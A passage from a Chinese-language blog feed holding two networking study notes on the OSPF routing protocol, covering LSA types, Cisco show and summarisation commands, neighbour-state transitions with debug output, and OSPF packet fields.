    <id>http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/OSPF%E7%90%86%E8%A7%A3%E4%B8%8D%E5%90%8C%E5%8C%BA%E5%9F%9FLSA(%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E9%80%9A%E5%91%8A)/</id>
    <published>2016-10-23T15:18:48.000Z</published>
    <updated>2020-04-08T02:38:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>#【OSPF】理解不同区域LSA(链路状态通告)</p><p>OSPF协议中LSA的作用是构造拓扑表,根据拓扑表利用SPF算法计算出最优路由放入路由表</p><p>LSA里面的信息包括：自己的RID，邻居的RID，我到这条链路的带宽，我的邻居到这条链路的带宽，路由条目，掩码等信息。</p><p>LSA共分为7类这里暂时介绍5类</p><p>同一区域LSDB数据库一致</p><ul><li>研究LSA从三方面看:<pre><code>1.传播范围2.通告者3.内容</code></pre></li><li>其中和路由有关系的有:<pre><code>LSA1 域内路由LSA3 域间路由LSA5 域外路由</code></pre></li></ul><hr><p><strong>LSA type 1 :Router LSA</strong></p><p>每台运行OSPF协议路由器都会产生LSA type 1</p><p>传播范围:只能在本区域传播<br>通告者：就是每台路由器<br>内容:<strong>点对点拓扑信息</strong>,<strong>直连接口路由</strong>,<br>    另外:连接到MA网络的拓扑信息（a transit network）只获取到metric和网络号,没有掩码就构不成路由<br>     <strong>标识自身路由器的位置关系如</strong>:ABR ASBR</p><p>使用命令:</p><ul><li>show ip ospf database router <pre><code>link state ID: 该路由器RIDADV router: 该路由器RID</code></pre></li></ul><hr><p><strong>LSA type 2 :Network LSA</strong></p><p>MA网络类型才会出现type 2 LSA</p><p>传播范围:只能在本区域传播<br>通告者：DR通告2类LSA(指定路由器)<br>内容:本网段网络掩码,描述区域内有运行OSPF路由器数量(根据RID显示列表),</p><ul><li>show ip ospf database network<pre><code>link state ID: DR&apos;s 连接接口ipADV router: DR&apos;s RID</code></pre></li></ul><p>PS：当MA网络中新增一台路由器时,获取R1和R2直接的路由是通过LSA 2的掩码+LSA 1的网络位和metric<br>transit = MA<br>ADV = advertising 通告<br><img src="http://jianfensec.com/usr/uploads/2LSA.jpg" alt="请输入图片描述"></p><hr><p><strong>LSA type 3 : Summary LSA</strong> </p><p>跨区域产生只为路由产生的LSA</p><p>传播范围:整个AS<br>通告者:ABR(每个区域边界路由器)<br>内容:路由(汇总LSA1+LSA2 域间路由)</p><ul><li>show ip route O IA  = ospf inter area route</li><li>show ip ospf database summary<pre><code>link state ID: Route(域间路由)ADV router: ABR&apos;s RID((根据区域变化))</code></pre></li></ul><hr><p><strong>LSA type 4: Summary ASB LSA</strong></p><p>告诉其他区域ASBR所在位置</p><p>传播范围:传播AS域,除了ASBR所在区域因为LSA1会传播ASBR位置<br>通告者:ASBR区域内的ABR产生<br>内容:非路由 只为找到ASBR位置</p><ul><li>show ip ospf database asbr-summary<pre><code>link state ID: ASBR&apos;s RIDADV router: ABR&apos;s RID(根据区域变化)</code></pre></li></ul><hr><p><strong>LSA type 5 : External LSA</strong><br>传播范围:整个AS<br>通告者:ASBR(as边界路由器)<br>内容:AS区域外路由</p><ul><li>show ip route<pre><code>O E2 = ospf external type 2(不累加cost值) 重分布默认20O E1 = ospf external type 1(累加cost值)</code></pre></li><li>show ip ospf database  external<pre><code>link state ID: Route(域外路由)ADV router: ASBR&apos;s RID</code></pre></li></ul><h2 id="PS-只要能产生5类LSA就被认定为ASBR"><a href="#PS-只要能产生5类LSA就被认定为ASBR" class="headerlink" title="PS:只要能产生5类LSA就被认定为ASBR"></a>PS:只要能产生5类LSA就被认定为ASBR</h2><h2 id="命令介绍"><a href="#命令介绍" class="headerlink" title="命令介绍"></a>命令介绍</h2><ol><li><p>max-lsa 限制LSA数量</p></li><li><p>(config-if)#ip ospf cost interface-cost  设置ospf cost值</p></li><li><p><strong>show ip ospf border-routers  查看路由器的边界路由器</strong>   </p></li><li><p>auto-cost reference-bandwidth(参考带宽) ref-bw 默认100Mps = 10的8次方bps</p><p>  修改参考带宽的理由:</p><pre><code>10M BW   cost  10100M BW  cost  11000M BW cost  1由于1000M已经是小数了所以取1那就体现不出100M和1000M的cost值 所以会去修改参考带宽10的8次方</code></pre><p>更多 show命令: [转载]<a href="http://itcopper.blog.51cto.com/3037339/557896" target="_blank" rel="external nofollow noopener noreferrer">http://itcopper.blog.51cto.com/3037339/557896</a></p></li></ol><hr><h2 id="ospf路由汇总要素"><a href="#ospf路由汇总要素" class="headerlink" title="ospf路由汇总要素"></a>ospf路由汇总要素</h2><pre><code>1.基于进程2.本地指向null 03.当明细消失汇总也会消失4.选择最小明细</code></pre><p><strong>域间汇总</strong></p><ul><li>在本区域所有ABR上汇总<pre><code>202.96.16.0/24202.96.17.0/24202.96.18.0/24202.96.19.0/24</code></pre></li></ul><pre><code>route ospf 110   area 0 range 202.96.16.0 255.255.255.252.0(区域号为明细路由所在区域)   area 0 range 202.96.16.0 255.255.255.252.0 not-advertise(不宣告)   **可用于安全策略阻止路由比如只允许访问前2个网段 拒绝后2个路由网段**   show ip route | include 202 查询指定包含字符</code></pre><hr><p><strong>域外汇总</strong> </p><ul><li><p>在ASBR上做</p><pre><code>198.8.8.5/24198.8.9.5/24router ospf 110     summary-address 198.8.8.0 255.255.254.0      后续参数       not-advertise（不宣告）同上       tag 设置标记区分</code></pre></li></ul><hr><p>向ospf区域注入默认路由（ <strong>下放的是5类外部路由</strong>）</p><p>1.default-information originate(进程) <strong>需要主动写默认路由才能下放成功且路由标示0 E2 cost为1</strong><br>2.default-information originate <strong>always</strong>  无需自己写默认路由</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#【OSPF】理解不同区域LSA(链路状态通告)&lt;/p&gt;
&lt;p&gt;OSPF协议中LSA的作用是构造拓扑表,根据拓扑表利用SPF算法计算出最优路由放入路由表&lt;/p&gt;
&lt;p&gt;LSA里面的信息包括：自己的RID，邻居的RID，我到这条链路的带宽，我的邻居到这条链路的带宽，路由条目，
      
    
    </summary>
    
    
      <category term="网络工程" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>【OSPF】协议特点基础笔记</title>
    <link href="http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/OSPF%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/OSPF%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/</id>
    <published>2016-10-22T15:18:48.000Z</published>
    <updated>2020-04-08T02:38:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OSPF-协议特点基础笔记"><a href="#OSPF-协议特点基础笔记" class="headerlink" title="[OSPF]协议特点基础笔记"></a>[OSPF]协议特点基础笔记</h1><p>OSPF(Open Shortest Path First开放式最短路径优先/<strong>接口敏感型协议</strong>）是一个内部网关协议:</p><p>链路（LINK）= 路由器接口<br>状态（state）= 描述接口以及其邻居路由器之间的关系</p><ul><li>特点：<pre><code>IGP内部网关路由协议链路状态型协议(link-State)支持无类VLSM CIDR   OSPF报文封装在IP报文中三层协议无端口所有有协议号89组播224.0.0.5/224.0.0.6(MA多路访问网络)</code></pre></li></ul><hr><p><strong>说道距离矢量和链路状态协议区别:</strong><br>PS :DV = Distance Vector (距离矢量)   LS = Link status (链路状态)</p><ul><li>DV和LS比较<pre><code>1.LS协议和DV协议最根本的区别是 LS协议会获取该路由的详细拓扑信息2.即使EIGRP所谓拓扑表为只有路由信息并无topology信息3.DV协议总是以传闻的方式去直接获取路由只知晓从哪个接口收到路由4.LS协议必须分层(划分区域)而DV协议不需要</code></pre></li></ul><hr><ul><li><strong>再说说LS协议划分区域的好处:</strong><pre><code>1.减少路由条目(域间汇总)2.本地拓扑变化只会影响一个区域(汇总后明细down不会影响其他区域)3.LSA细节化(节省带宽)</code></pre></li></ul><hr><ul><li><p><strong>分层要点:</strong></p><pre><code>area 0 (传输区域 骨干区域)只要一个接口在area0backbone routers(骨干路由器-&gt;area0)</code></pre></li><li><p>ABR(area border router)</p><pre><code>所有区域必须和area 0相接如果不是则需要其他技术</code></pre></li></ul><hr><p><strong>OSPF建立邻接关系的过程:</strong><br>HELLO(建邻居)      -&gt;  link-state database (存放LSA) -&gt; SPF算法(树形结构无环) -&gt; 路由表(最优路由)<br>                                        topology table (路由+拓扑)           </p><ul><li>down state(关闭状态)<pre><code>1.    尚未交互信息    OSPF: Interface Serial1/0 going Up    OSPF: rcv. v:2 t:1 l:48 rid:2.2.2.2          aid:0.0.0.0 chk:E694 aut:0 auk: from Serial1/0</code></pre></li></ul><p>————————-&gt;224.0.0.5—–</p><ul><li>init state(初始化状态)<pre><code>1.    开始发送HELLO包(自己Route ID)    OSPF: rcv. v:2 t:1 l:48 rid:2.2.2.2          aid:0.0.0.0 chk:E694 aut:0 auk: from Serial1/0</code></pre></li></ul><hr><ul><li>Two-way state(双向状态)<pre><code>1.    收到一个HELLO包,发现自己route ID    OSPF: 2 Way Communication to 2.2.2.2 on Serial1/0, state 2WAY</code></pre></li></ul><hr><pre><code>扩展:到这里2个接口已经是neighbor(邻居)但是要达到adjacency(邻接)关系需要按下面要求:    1.    neighbor只交互了HELLO包    2.    adjacency交互了LSA才能形成    3.    邻接一定是邻居反之不是</code></pre><p>————MA网络(选举DR/BDR通过HELLO报文)和P2P网络————</p><pre><code>扩展:OSPF网络类型:   1.Point-to-Point WAN links:所有邻居都会成为邻接关系   MA网络:         1.    BMA   (以太网)       2.    NBMA    (帧中继)       由于多路访问使得频繁建立邻接关系组播流量庞大       为了减小发送LSA频率(寻找班长和副班长)               DR： designated 指定路由器               BDR： backup 备份路由器               DROTHERS和DR,BDR形成adjacency               DROTHERS and DROTHERS只形成tow-way(交互完HELLO包)            MA网络建立邻居               224.0.0.5  DR/BDR发送信息               224.0.0.6  DRothers监听与DR/BDR发送信息 当拓扑变动drothers通过.6组播发送给DR/BDR           DR选举顺序:               1.较大的pirority (default=1)               2.较大的route ID           DR/BDR选举特点:               1.**DR/BDR非抢占**               2.当DR 接口 down BDR变成DR                  DRothers再选BDR               3.DR/BDR/DROTHER是接口概念(接口敏感性协议)               4.不同网段分别选DR</code></pre><hr><ul><li>exstart state<pre><code>1.互发Route ID选择主从关系(first DBD包)         发送DBD是会附带序列号和标示:             init         More      master/Slave 隐式确认:    1.根据主路由器的序列号    发送:Send DBD to 2.2.2.2 on Serial1/0 seq 0x606 opt 0x52 flag 0x7 len 32    接收:rcv. v:2 t:2 l:32 rid:2.2.2.2 aid:0.0.0.0 chk:7E02 aut:0 auk: from Serial1/0    Rcv DBD from 2.2.2.2 on Serial1/0 seq 0x23F4 opt 0x52 flag 0x7 len 32  mtu 1500 state EXSTART        NBR Negotiation Done. We are the SLAVE本地R1 route ID : 1.1.1.1 所以为slave同步为master序列号0x23F4</code></pre></li></ul><p>扩展        LSA序列号(sequence numbering):<br>                    1.线性(从小到大)<br>                    2.圆形<br>                    3.棒棒糖(线性(负)和圆形的结合)</p><hr><ul><li>exchange state<pre><code>1.交互DBD目录Send DBD to 2.2.2.2 on Serial1/0 seq 0x23F4 opt 0x52 flag 0x0 len 32rcv. v:2 t:2 l:52 rid:2.2.2.2 aid:0.0.0.0 chk:990E aut:0 auk: from Serial1/0Rcv DBD from 2.2.2.2 on Serial1/0 seq 0x23F5 opt 0x52 flag 0x3 len 52  mtu 1500 state EXCHANGESend DBD to 2.2.2.2 on Serial1/0 seq 0x23F5 opt 0x52 flag 0x0 len 32rcv. v:2 t:2 l:32 rid:2.2.2.2 aid:0.0.0.0 chk:7E06 aut:0 auk: from Serial1/0OSPF: Rcv DBD from 2.2.2.2 on Serial1/0 seq 0x23F6 opt 0x52 flag 0x1 len 32  mtu 1500 state EXCHANGEOSPF: Exchange Done with 2.2.2.2 on Serial1/0MTU 1500 相同在DBD报文中所以这也是达到FULL的条件（Maximum Transmission Unit 最大传输单元）</code></pre></li></ul><hr><ul><li>loading state<pre><code>1.交互LSR LSU    Rcv LS UPD from 2.2.2.2 on Serial1/0 length 64 LSA count 1</code></pre></li></ul><hr><p>扩展:<br>       LSA接收方式:<br>            1.    不存在该LSA-&gt;add to database -&gt; Send LSACK-&gt;Flood LSA-&gt;calculate放入路由表<br>            2.    收到相同LSA-&gt;比较序列号判断新旧-&gt;相同丢弃/不同则回溯源端LSU</p><pre><code>OSPF算法(dijkstra&apos;s SPF):     every router in an area has the identical link-state database 在同一区域内的每台路由器都有统一链路数据库 每台路由器以自己为根计算一个树形最优无环路径 cost = 10^8/带宽(bps) 10^8/1.544*10^6 = 64 10^8 = 100M  1.544是T1链路的速率Mbps **路由方向入接口相加就是到达链路的cost值** **数据方向出接口相加就就是达到链路的cost值**</code></pre><hr><p>Full state<br>    1.    lsack<br>        Synchronized with 2.2.2.2 on Serial1/0, state FULL</p><hr><p>扩展:<br>        OSPF更新方式<br>            1.    触发更新<br>            2.    周期更新(每30分钟泛洪/60分钟老化)</p><hr><p><strong>OSPF报文内容和类型</strong></p><pre><code>[ospf packet types]1）Version Number(OSPF版本号)2）Type        1.HELLO                                            HELLO                        包含内容:                                1.router ID                                2.hello and dead intervals *                                        1)    10S/40S         Point-to-Point                                        2)    30s/120s        MA                                3.neighbors                                4.area ID*                                5.router priority                                6.DR ip address                                7.BDR ip address                                8.authentication password*                                9.stub area flag *                                PS: *部分一致才能建立邻居        2.DBD                    database Description                        1.    LSA摘要-目录                         2.    隐式确认序列号同步                        3.    MTU需要一致(最大传输单元 单位：字节  英文：Maximum Transmission Unit)        3.LSR                    Link-state Request                        1.发送需要LSA的摘要信息        4.LSU                    Link-state Update                        1.更新给对方对应的详细LSA信息        5.LSACK                    Link-state Acknewledgment                        1.LSACK只对LSU确认3）Packet Length4）Route ID        1)选举方式:            1.手工指定(任意,唯一标示)            2.loopback口最大的IP地址            3.物理接口最大的IP地址5）Area ID6）Check-sum7）authen-tication Type        1.无        2.明文        3.密文8）authen-tication(秘钥)Data</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OSPF-协议特点基础笔记&quot;&gt;&lt;a href=&quot;#OSPF-协议特点基础笔记&quot; class=&quot;headerlink&quot; title=&quot;[OSPF]协议特点基础笔记&quot;&gt;&lt;/a&gt;[OSPF]协议特点基础笔记&lt;/h1&gt;&lt;p&gt;OSPF(Open Shortest Path 
      
    
    </summary>
    
    
      <category term="网络工程" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
    
  </entry>
  
</feed>
